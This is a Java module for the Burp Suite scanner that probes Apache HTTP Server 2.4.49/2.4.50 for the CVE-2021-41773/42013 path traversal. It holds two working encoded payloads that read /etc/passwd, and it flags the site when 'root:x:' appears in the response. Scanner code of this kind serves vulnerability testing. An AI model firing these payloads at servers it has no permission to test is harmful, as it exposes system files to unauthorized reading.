package burp.scan.active.poc;

import burp.IBurpExtenderCallbacks;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.scan.active.ModuleBase;
import burp.scan.lib.Confidence;
import burp.scan.lib.GtScanIssue;
import burp.scan.lib.Risk;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.lib.web.utils.GtSession;
import burp.scan.lib.web.utils.GtURL;
import burp.scan.tags.TagTypes;
import burp.scan.tags.TagUtils;

import java.io.IOException;
import java.util.HashSet;
import java.util.Set;

public class ApachePathTravel implements ModuleBase {
    String[] PAYLOADS = {
            ".%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            ".%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
    };
    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        if (webInfo.getSiteInfo().containsRunnedModule(this)) {
            return ;
        }

        GtURL u = new GtURL(webInfo.getUrl());
        if (u.getBaseUrl().equals(u.getFileDir())) {
            return ;
        }
        webInfo.getSiteInfo().addRunnedModule(this);
        String dirUrl = u.getFileDir();
        GtSession request = new GtSession();
        for (var payload : PAYLOADS ) {
            String targetUrl = dirUrl + payload;
            try {
                var result = request.burpGet(targetUrl);
                byte[] respBytes = result.getResponse();
                IResponseInfo respInfo = callbacks.getHelpers().analyzeResponse(respBytes);
                int bodyOffset = respInfo.getBodyOffset();
                String respBody = new String(respBytes, bodyOffset, respBytes.length - bodyOffset);
                if (respBody.contains("/root:/bin/bash")||respBody.contains("root:x:")) {
                    IScanIssue issue = new GtScanIssue(
                            result.getHttpService(),
                            new GtURL(targetUrl).getURL(),
                            result,
                            "Apache Path Travel",
                            "The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.\n" +
                                    "\n" +
                                    "CVE-2021-42013 is a vulnerability that caused by incomplete fix of CVE-2021-41773, an attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.\n" +
                                    "\n" +
                                    "This vulnerability affects Apache HTTP Server 2.4.49 and 2.4.50 and not earlier versions.\n" +
                                    "\n" +
                                    "References:",
                            "https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-42013\n"+
                            "https://httpd.apache.org/security/vulnerabilities_24.html\n" +
                                    "https://twitter.com/roman_soft/status/1446252280597078024",
                            Risk.High,
                            Confidence.Certain
                    );
                    callbacks.addScanIssue(issue);
                    webInfo.addIssue(issue);
                }
            } catch (IOException e) {
                callbacks.printError(e.getMessage());
            }
        }
    }

    @Override
    public Set<String> getTags() {
        Set<String> tags = new HashSet<>();
        tags.add(TagUtils.toStandardName(TagTypes.ApacheHttp_Base));
        return tags;
    }
}
